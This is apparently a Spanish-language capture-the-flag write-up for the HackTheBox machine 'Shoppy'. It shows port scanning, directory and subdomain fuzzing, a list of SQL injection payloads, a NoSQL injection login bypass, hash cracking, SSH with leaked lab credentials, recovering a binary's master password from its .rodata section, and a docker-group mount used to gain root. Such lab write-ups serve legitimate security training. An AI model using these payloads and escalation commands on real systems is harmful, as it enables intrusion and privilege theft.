---
layout: default
title: Shoppy
parent: HackTheBox
grand_parent: Writeups
---

# Shoppy
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Enumeracion

### Escaneo con nmap

Iniciamos con un escaneo de nmap con el comando:

```sudo nmap -sS -n -Pn --open -p- 10.10.11.180```

El cual le estamos diciendo que con:

- sS: haga un TCP SYN Scan el cual hace un escaneo sigiloso sin completar las conexiones TCP, responde con un SYN/ACK si esta abierto

- -n: para que no haga resolucion DNS y tarde menos el escaneo

- -Pn: para evitar el descubrimiento de hosts

- --open: para que solo muestre los puertos abiertos

- -p-: para que escanee todo el rango de puertos

Este escaneo nos reportara 3 puertos abiertos:

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9093/tcp open  copycat
```

Ahora escanearemos los puertos buscando la version y servicio que esten corriendo:

```nmap -sCV -p22,80,9093 10.10.11.180```

El primer puerto que nos sale es el 22:

```
22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9e5e8351d99f89ea471a12eb81f922c0 (RSA)
|   256 5857eeeb0650037c8463d7a3415b1ad5 (ECDSA)
|_  256 3e9d0a4290443860b3b62ce9bd9a6754 (ED25519)
```
Corresponde a SSH y les adelanto que no podemos hacer nada sin las credenciales correctas

El segundo puerto es el 80 (HTTP)

```
80/tcp   open  http     nginx 1.23.1
|_http-server-header: nginx/1.23.1
|_http-title: Did not follow redirect to http://shoppy.htb
```

Vemos como esta usando la version 1.23.1 de nginx como servidor web, y lo mas importante es que nos esta redirigiendo a ```http://shoppy.htb```, asi que si ponemos la IP de la maquina en un buscador web, nos sale algo como esto:

![](/assets/img/shoppy/shoppy1.png)

Donde nos dice que no puede encontrar este sitio, pero en el URL aparace ```shoppy.htb```, asi que como dije, nos redirige a ese dominio, asi que es evidente que se esta aplicando virtual hosting, entonces lo agregaremos e nuestro ```/etc/hosts``` con el comando:

```echo "10.10.11.180     shoppy.htb" | tee -a /etc/hosts```

Les puedo decir que el puerto ```9093``` no contiene nada interesante asi que pasamos de el

### Fuzzing de directorios

La pagina realmente no tiene nada, asi que queda buscar directorios que esta pagina este usando wfuzz con el comando:

```wfuzz -u 'http://shoppy.htb/FUZZ' -w /usr/share/wordlists/directory-list-2.3-medium.txt -t 100 --hc=404```


El cual le estamos diciendo que con:

- -u: el URL donde la palabra ```FUZZ``` se usa para sustiur cada linea el diccionario en donde se encuentre esa palabra, en nuestro caso es el final de la URL

- -w: para indicar el wordlist

- -t: para indicar cuantos hilos queremos, osea para ejecutar tareas al mismo tiempo (en paralelo)

- --hc: para ocultar el codigo de estado 404

Vemos como nos encontro los siguientes directorios:

```
"assets"                                                                                 
"admin"                                                                                   
"css"                                                                                     
"Login"      
"js"                                                                                       
"fonts"                                                                                   
"Admin"                                                                                   
"exports"                                                                                 
"LogIn"                                                                                   
"LOGIN" 
```

Hay varios con el mismo nombre de ```login``` pero realmente todos ingresan a lo mismo, a esta pestaña de login:

![](/assets/img/shoppy/shoppy2.png)

### Fuzzing de subdominios

Nunca esta de mas ver si hay subdominios en el dominio web, asi que con wfuzz podemos hacerlo, ingresando el comando:

```wfuzz -u 'http://shoppy.htb/' -H 'Host: FUZZ.shoppy.htb' -t 100 -w /usr/share/wordlists/bitquark-subdomains-top100000.txt --hh=169```

Este comando es similar al anterior, solo que ahora con ```--hh=169``` le indicamos que oculte las respuesta con una longitud de 169, y el 169 es por que esa es la longitud de caracteres de un subdominio incorrecto.

Al final solo descubrio un subdominio (tambien los debemos de agregar a los hosts):

```000047340:   200        0 L      141 W      3122 Ch     "mattermost"```

El subdominio es: ```mattermost```

El cual es otra pestaña de login:

![](/assets/img/shoppy/shoppy3.png)

## Flag de user

Ahora toca buscar y explotar vulnerabilidades para conseguir la primera flag. Empezaro con el primer dominio que encontramos: ```http://shoppy.htb/login```, como tenemos un login, lo mas comun es probar inyecciones SQL, podemos probar con los payloads mas comunes para SQL injection, como estos:

```
''
`
``
,
"
""
/
//
\
\\
;
' or "
-- or # 
' OR '1
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
' OR '' = '
```
Y dependiendo de la respuesta sabremos de que se trata, en mi caso simplemente le mandare una comilla al input del usuario, y encontraseña lo que sea (pueden usar BurpSuite o curl, en mi caso usare curl por que tengo muchas cosas abiertas, y el Burp hace que me pete la patata de compu que tengo jajaja)

Con curl lanzare la siguiente peticion:

```curl shoppy.htb/login -id "username='&password=12345"```

Esto respondera con un 504, osea que se tardo mucho y no respondio, asi que empece a probar inyecciones basadas en tiempo y a ciegas y tampoco funciono, entonces lo otro que queda es probar inyecciones NoSQL, asi que intentare con un payload de una inyeccion NoSQL para evadir el login: ```admin'||'1==1```

Esto hara nos permitira iniciar con el usuario ```admin```, ya que con ```1==1``` nos permitita que la consulta siempre sea verdadera y la contraseña puede ser la que sea.

Vemos que una vez dentro tenemos otro input donde podemos buscar usuarios:

![](/assets/img/shoppy/shoppy4.png)

Nuevamente nos encontramos con una NoSQL injection, y pasandole el mismo payload anterior pero sin ```admin```, podemos ver que nos muestran mas usuarios: ```'||'1==1```

![](/assets/img/shoppy/shoppy5.png)

Y encontro otro usuario llamado ```Josh``` y el hash de su contraseña, asi que ahora queda crackearlo para conseguir su contraseña, en mi caso usare crackstation, y nos arroja que es un hash MD5 y su contraseña: ```remembermethisway```.

Solo queda saber en donde se ponen estas credenciales. Si recordamos tenemos otra pestaña de login (http://mattermost.shoppy.htb), asi que probare meterlas alli, y pues funciono, una vez dentro me puse a chismosear a ver que encontraba y di que en una seccion que se llama ```Deploy Machine``` hay credenciales para el usuario ```jeager```:

![](/assets/img/shoppy/shoppy6.png)

Recordemos que tenemos el puerto del SSH abierto, asi que podemos probar si esas credenciales son correctas:

```ssh jaeger@10.10.11.180``` 

Y la contraseña es: ```Sh0ppyBest@pp!```

Vemos que ingresamos correctamente y tenemos la primera flag:

![](/assets/img/shoppy/shoppy7.png)

## Flag de root

Ahora con el comando ```sudo -l``` veremos que podemos ejecutar como sudo desde el usuaro ```jeager```, y vemos que podemos ejecutar un binario con el usuario ```deploy```:

```
User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager
```

Y si lo intentamos correr vemos que nos pide una contraseña:

```
jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: oli  
Access denied! This incident will be reported !
```

Aqui opte por mostrar la seccion .rodata del binario, ya que esta seccion contiene las variables globales y los strings, use el comando:

```objdump -s -j .rodata /home/deploy/password-manager```

Y vemos como en esta parte el input espera por un string llamado ```Sample```:

```
2050 20706173 73776f72 643a2000 00530061   password: ..S.a
 2060 006d0070 006c0065 00000000 00000000  .m.p.l.e........
```

Asi que volvemos a ejecutar el binario pasandole eso y vemos que nos muestra las credenciales de deploy:

```
jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: Sample
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: Deploying@pp!
```

Una vez dentro y si pones el comando ```ìd``` podemos ver como pertenecemos al grupo ```docker``` y podemos ejecutar el comando de docker para montar un contenedor:

```uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)```

Si buscamos en GFObins una manera de escalar privilegios nos encontramos que podemos montar un contenedor en ```/``` y consiguiendo acceso como root mientras tengamos la imagen ```alpine``` en docker.

Asi que ingresamos:

```docker run -v /:/mnt --rm -it alpine chroot /mnt sh```

Y ahora ya somos root y tenemos la flag:

![](/assets/img/shoppy/root.png)

Eso ha sido todo, gracias por leer ❤
